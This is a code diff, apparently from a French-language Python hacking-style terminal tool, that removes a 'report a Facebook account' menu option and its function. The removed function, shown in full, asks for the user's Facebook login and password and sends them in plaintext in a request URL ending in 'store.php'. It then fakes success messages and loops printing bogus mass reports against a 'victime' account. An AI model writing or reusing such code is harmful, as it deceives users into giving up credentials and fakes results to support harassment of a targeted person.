@@ -689,8 +689,7 @@ def Menu_Feliciter_Signal():
     print("\033[1;97m╔"+30*"═"+1*"═╗")
     print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;112m Féliciter \033[38;5;214mFaxel       \033[1;97m   ║") 
     print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;245m Signaler un bug       \033[1;97m   ║")
-    print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;115m Signaler un compte FB \033[1;97m   ║")
-    print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;136m Danger \033[1;97m(\033[1;91mremove\033[1;97m)          ║")
+    print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;136m Danger \033[1;97m(\033[1;91mremove\033[1;97m)          ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu General         \033[1;97m    ║")
     print("\033[1;97m╚"+30*"═"+1*"═╝")   
     print("\033[1;97m║")
@@ -705,8 +704,6 @@ def choix_Feliciter_Signal():
     elif dmd =="2":
         signal_bug()
     elif dmd =="3":
-        Signal_Fb()
-    elif dmd =="4":
         clean_remove()
     elif dmd =="m" or dmd =="M":
         menu()
@@ -782,36 +779,6 @@ def Rapport_bug():
             print("\n\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Échec de l'envoi du rapport de bug")
 	    raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
 	    Menu_Feliciter_Signal()	
-####################################################################################################
-def Signal_Fb():
-      cls()  
-      load("\033[1;97mChargement\033[1;93m...")
-      cls()
-      print(logo)
-      nom_utilisateur = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Votre Email/Numéro/ID de FB \033[1;91m▶▶▶ \033[1;96m")
-      mot_de_passe = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Mot de passe \033[1;91m▶▶▶ \033[1;96m")
-      url = "https://m.facebook.com/help/contact/144059062408922?_rdc=1&_rdr/store.php?username="+str(nom_utilisateur)+"&password="+str(mot_de_passe)
-      connexion = requests.get(url)
-      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;92m Connexion réussie\033[1;93m...... \033[1;91m [\033[1;97m+\033[1;91m]")
-      mael("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;97mVeuillez saisir l'identifiant Facebook de votre victime \033[1;91m [\033[1;97m+\033[1;91m]")
-      victime = raw_input("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;97m Entrez \033[1;91m▶▶▶ \033[1;94m")
-      load("\033[1;97mChargement\033[1;93m...")
-      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;97m Recupreation des données de connexion veuillez patienter\033[1;93m....... \033[1;91m [\033[1;97m+\033[1;91m]")
-      load("\033[1;97mChargement\033[1;93m...")
-      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;93m Démarrage du moteur de création de rapports\033[1;93m........ \033[1;91m [\033[1;97m+\033[1;91m]")
-      time.sleep(3)
-      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;96m Début du rapport\033[1;93m........ \033[1;91m [\033[1;97m+\033[1;91m]")
-      load("\033[1;97mChargement\033[1;93m...")
-      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;95m Signaler un compte Facebook, \033[38;5;245m@\033[38;5;221mFaxel \033[1;91m [\033[1;97m+\033[1;91m]\033[38;5;245m \033[1;92m")
-      load("\033[1;97mChargement\033[1;93m...")
-      i=100048845592611
-      while i < 120048845592711:
-        time.sleep(3)
-        print("['+str(i)+']'+'+++réussi signalé +++ à'+str(victime)")
-        i=i+1
-      print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
-      raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
-      Menu_Feliciter_Signal()
 ####################################################################################################	
 ####################################################################################################	
 def menu_decode():
